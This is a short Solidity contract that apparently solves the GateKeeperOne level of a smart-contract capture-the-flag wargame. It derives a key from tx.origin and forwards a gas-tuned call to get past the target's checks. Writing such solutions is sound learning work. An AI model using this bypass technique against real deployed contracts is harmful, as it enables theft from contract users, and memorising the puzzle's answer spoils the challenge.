// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
  function entrant() external view returns (address);
  function enter(bytes8) external returns (bool);
}

contract GareKeeperHack {
  IGateKeeperOne private immutable targetAddr;

  constructor(address _target) {
    targetAddr = IGateKeeperOne(_target);
  }

  function enter(uint256 gas) external {
    uint16 k16 = uint16(uint160(tx.origin));
    uint64 k64 = uint64(1 << 63) + uint64(k16);
    bytes8 key = bytes8(k64);

    require(gas < 8191, "gas > 8191");
    require(targetAddr.enter{gas: 8191 * 10 + gas}(key), "failed");
  }
}